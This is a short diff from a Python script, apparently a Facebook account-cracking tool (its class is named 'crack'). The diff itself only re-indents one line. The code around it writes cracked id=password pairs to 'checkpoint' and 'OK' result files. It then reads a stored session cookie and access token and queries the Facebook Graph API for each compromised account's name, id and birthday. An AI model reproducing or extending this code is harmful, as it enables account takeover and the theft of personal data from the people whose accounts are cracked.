@@ -1448,7 +1448,7 @@ class crack:
         self.cp.append("%s=%s"%(id,pw))
         open(files_cp,"a+").write("%s=%s=%s\n"%(id,pw,ttl.replace(' • ','')))
         break
-    elif log['status'] == 'ok':files_ok = "OK/%s.json"%(tanggal)
+                elif log['status'] == 'ok':files_ok = "OK/%s.json"%(tanggal)
         try:
           with requests.Session() as xyz:cookie = {'cookie':open('login/cookie.json','r').read()}
           url = ("https://graph.facebook.com/%s?fields=name,id,birthday&access_token=%s"%(id,open('login/token.json','r').read()))
